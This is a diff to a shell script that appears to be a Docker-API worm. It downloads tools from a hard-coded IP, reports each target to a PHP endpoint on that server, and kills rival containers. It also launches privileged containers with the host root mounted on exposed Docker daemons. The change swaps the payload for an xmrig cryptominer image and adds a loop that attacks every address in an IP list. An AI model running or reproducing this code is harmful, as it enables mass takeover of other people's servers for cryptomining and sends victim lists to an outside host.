@@ -8,7 +8,6 @@ if ! type zgrab 2>/dev/null 1>/dev/null; then wget http://45.9.148.85/bin/zgrab 
 if ! type docker 2>/dev/null; then curl -sLk https://get.docker.com | bash ; fi
 docker stop $(docker ps | grep -v 'CONTAINER' | grep -v 'tntpwner2\|b0rgdrone24\|dockgeddon' | awk '{print $1}')
 clear ; echo "" ; echo ""
-echo CgoKICAgICAgICBfX19fXyAgICAgICAgICAgICAgICAgICAgX19fX18gICAgX18gIF9fX19fICAgXyBfIF8gICAgICAgICAgICAgIAogICAgICAgL19fICAgXF9fXyAgX18gXyBfIF9fIF9fXy9fXyAgIFwvXCBcIFwvX18gICBcIHwgKF8pIHwgX19fX18gIF9fXyAgCiAgICAgICAgIC8gL1wvIF8gXC8gX2AgfCAnXyBgIF8gXCAvIC9cLyAgXC8gLyAgLyAvXC8gfCB8IHwgfC8gLyBfIFwvIF9ffCAKICAgICAgICAvIC8gfCAgX18vIChffCB8IHwgfCB8IHwgLyAvIC8gL1wgIC8gIC8gLyAgICB8IHwgfCAgIDwgIF9fL1xfXyBcIAogICAgICAgIFwvICAgXF9fX3xcX18sX3xffCB8X3wgfF9cLyAgXF9cIFwvICAgXC8gICAgIHxffF98X3xcX1xfX198fF9fXy8gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIF8gICBfICAgICAgICAgICAgICBfX18gIF9fXyAgICBfXyAgICBfX18gICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICB8IHxffCB8X18gICBfX18gICAgLyBfX1wvIF8gXCAgL19fXCAgLyBfIFwgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgIHwgX198ICdfIFwgLyBfIFwgIC9fX1wvLyB8IHwgfC8gXC8vIC8gL19cLyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgfCB8X3wgfCB8IHwgIF9fLyAvIFwvICBcIHxffCAvIF8gIFwvIC9fXFwgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgXF9ffF98IHxffFxfX198IFxfX19fXy9cX19fL1wvIFxfL1xfX19fLyAgICAgICAgICAgICAgICAgCgoKCgoK | base64 -d
 sleep 6
 
 chmod +x /usr/bin/zgrab
@@ -34,7 +33,7 @@ echo '##################################################'
 curl -sLk http://45.9.148.85/input/da.php?vuln=$TARGET -o /dev/null
 echo $TARGET
 
-timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host mangletmpuser/dockgeddon
+timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host xululol/xmrig
 
 done
 }
@@ -50,3 +49,14 @@ dAPIpwn $RANGE 4243 $RATE_TO_SCAN
 done 
 
 
+dAPIpwn(){
+    ip_list_file=$1
+    port=$2
+    while read -r ipaddy
+    do
+        TARGET=$ipaddy:$port
+        echo '##################################################'
+        echo $TARGET
+        timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host xululol/xmrig
+    done < "$ip_list_file"
+}
